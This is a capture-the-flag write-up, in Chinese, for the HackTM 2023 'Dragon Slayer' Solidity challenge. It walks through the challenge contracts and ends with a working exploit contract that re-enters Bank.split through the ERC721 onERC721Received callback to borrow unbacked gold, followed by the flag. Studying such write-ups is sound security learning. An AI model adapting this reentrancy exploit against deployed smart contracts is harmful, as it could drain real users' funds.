---
title: Blockchain - Dragon Slayer
description: 2023 | HackTM CTF | smart contract
tags:
    - smart contract
    - solidity
    - flashloan
---

## 题目

Prove yourself a true champion. Kill the mighty dragon and earn the right to call yourself a dragon slayer.

> nc 34.141.16.87 30100

[:material-download: `dragon_slayer_contracts.zip`](static/dragon_slayer_contracts.zip)

## 解题思路

- 目标是击败恶龙w

    ```js
    // contract Setup
    function isSolved() external view returns (bool) {
        return knight.health() > 0 && knight.dragon().health() == 0;
    }
    ```

- `Dragon` 的攻击力、防御力以及血量都非常高

    ```js
    // contract Dragon
    constructor(address knight_) {
        knight = knight_;
        health = 1_000_000;
        clawAttack = 1_000_000;
        fireAttack = 10_000_000;
        defence = 500_000;
        attackRound = 0;
    }
    ```

- 而 `Knight` 初始只有 `Bronze Dagger` 和 `Wooden Shield`

    ```js
    // contract Shop
    struct ItemProperties {
        string name;
        uint price;
        ItemType itemType;
        uint attack;
        uint defence;
        bool hasAntiFire;
    }

    constructor(address goldCoin_) {
        goldCoin = GoldCoin(goldCoin_);
        item = new Item();

        item.mint(address(this), 1, 10, "");
        items[1] = ItemProperties("Bronze Dagger", 10 ether, ItemType.SWORD, 1, 0, false);

        item.mint(address(this), 2, 10, "");
        items[2] = ItemProperties("Wooden Shield", 10 ether, ItemType.SHIELD, 0, 1, false);

        item.mint(address(this), 3, 10, "");
        items[3] = ItemProperties("Abyssal Whip", 1_000_000 ether, ItemType.SWORD, 1_000_000, 0, false);

        item.mint(address(this), 4, 10, "");
        items[4] = ItemProperties("Dragonfire Shield", 1_000_000 ether, ItemType.SHIELD, 0, 1_000_000, true);

        // msg.sender is Knight
        item.mint(msg.sender, 1, 1, "");
        item.mint(msg.sender, 2, 1, "");
    }
    ```

- 购买商品需要足够的 `GoldCoin`，卖掉初始持有的 items 也不够购买 `Abyssal Whip` 和 `Dragonfire Shield`，并且 `Shop` 也没有 `GC` 支付 XD

    ```js
    // contract Shop
    function buyItem(uint itemId) external {
        goldCoin.transferFrom(msg.sender, address(this), items[itemId].price);
        item.mint(msg.sender, itemId, 1, "");
    }

    function sellItem(uint itemId) external {
        item.burn(msg.sender, itemId, 1);
        goldCoin.transfer(msg.sender, items[itemId].price); // no goldCoin in shop at first
    }
    ```

- 那么，得想办法从 `Bank` 弄点 `GC` 用 =ω=
    - `BankNote` 遵循 `ERC721` 代币标准，且 `mint()` 中调用了 `_safeMint()`

        ```js
        // contract BankNote
        function mint(address to, uint256 tokenId) public onlyOwner {
            _safeMint(to, tokenId);
        }
        ```

    - 接下来需要想办法让 `_safeMint()` 调用设计好的 `onERC721Received()`。`Bank` 中 `deposit()`、`merge()` 和 `split()` 使用到了 `BankNote.mint()`，不过除 `Knight` 外，其他地址并没有 `GC`。因而在未持有 `BN` 和 `GC` 的情况下，可通过 `Bank.merge()` 触发 `BankNote.mint()`，其中传入数组 `bankNoteIdsFrom` 的长度为 $0$

        ```js
        // contract Bank
        function deposit(uint amount) external {
            require(amount > 0, "ZERO");

            goldCoin.burn(msg.sender, amount);

            _ids.increment();
            uint bankNoteId = _ids.current();

            bankNote.mint(msg.sender, bankNoteId);
            bankNoteValues[bankNoteId] = amount;
        }

        function merge(uint[] memory bankNoteIdsFrom) external {
            uint totalValue;

            for (uint i = 0; i < bankNoteIdsFrom.length; i++) {
                uint bankNoteId = bankNoteIdsFrom[i];

                require(bankNote.ownerOf(bankNoteId) == msg.sender, "NOT_OWNER");
                bankNote.burn(bankNoteId);
                totalValue += bankNoteValues[bankNoteId];
                bankNoteValues[bankNoteId] = 0;
            }

            _ids.increment();
            uint bankNoteIdTo = _ids.current();
            bankNote.mint(msg.sender, bankNoteIdTo);
            bankNoteValues[bankNoteIdTo] += totalValue;
        }

        function split(uint bankNoteIdFrom, uint[] memory amounts) external {
            uint totalValue;
            require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, "NOT_OWNER");

            for (uint i = 0; i < amounts.length; i++) {
                uint value = amounts[i];

                _ids.increment();
                uint bankNoteId = _ids.current();

                bankNote.mint(msg.sender, bankNoteId);
                bankNoteValues[bankNoteId] = value;
                totalValue += value;
            }

            require(totalValue == bankNoteValues[bankNoteIdFrom], "NOT_ENOUGH");
            bankNote.burn(bankNoteIdFrom);
            bankNoteValues[bankNoteIdFrom] = 0;
        }
        ```

    - 采用类似 flashloan 的方式使用 `Bank.split()`，使用完后 `deposit()` 再转移给 `bankNoteIdFrom`，就能通过判断 `totalValue == bankNoteValues[bankNoteIdFrom]`

        ```js
        // contract Bank
        function deposit(uint amount) external {
            require(amount > 0, "ZERO");

            goldCoin.burn(msg.sender, amount);

            _ids.increment();
            uint bankNoteId = _ids.current();

            bankNote.mint(msg.sender, bankNoteId);
            bankNoteValues[bankNoteId] = amount;
        }

        function transferPartial(uint bankNoteIdFrom, uint amount, uint bankNoteIdTo) external {
            require(bankNote.ownerOf(bankNoteIdFrom) == msg.sender, "NOT_OWNER");
            require(bankNoteValues[bankNoteIdFrom] >= amount, "NOT_ENOUGH");

            bankNoteValues[bankNoteIdFrom] -= amount;
            bankNoteValues[bankNoteIdTo] += amount;
        }
        ```

### Exploit

```js
contract Hack is IERC721Receiver {
    Setup setup;
    Knight knight;
    Bank bank;
    uint visitCnt;

    constructor(address instance) {
        setup = Setup(instance);
        knight = Knight(setup.knight());
        bank = Bank(knight.bank());

        uint[] memory emptyBankNoteIds;
        bank.merge(emptyBankNoteIds); // deploying, onERC721Received will not be called
    }

    function exploit() external {
        setup.claim();

        uint[] memory amounts = new uint[](2);
        amounts[0] = 2_000_000 ether;
        amounts[1] = 0;
        bank.split(1, amounts);
    }

    function attack() internal {
        bank.withdraw(2);
        IERC20(knight.goldCoin()).transfer(address(knight), 2_000_000 ether);

        knight.buyItem(3);
        knight.buyItem(4);
        for (uint i = 0; i < 2; i ++) knight.fightDragon();
        knight.sellItem(3);
        knight.sellItem(4);

        knight.bankDeposit(2_000_000 ether);
        knight.bankTransferPartial(4, 2_000_000 ether, 1);
    }

    function onERC721Received(address, address, uint256 tokenId, bytes calldata) public returns (bytes4) {
        if (visitCnt == 1) {
            attack();
        }
        visitCnt += 1;
        return this.onERC721Received.selector;
    }
}
```

### Flag

> HackTM{n0w_g0_g3t_th4t_run3_pl4t3b0dy_b4af5ff9eab4b0f7}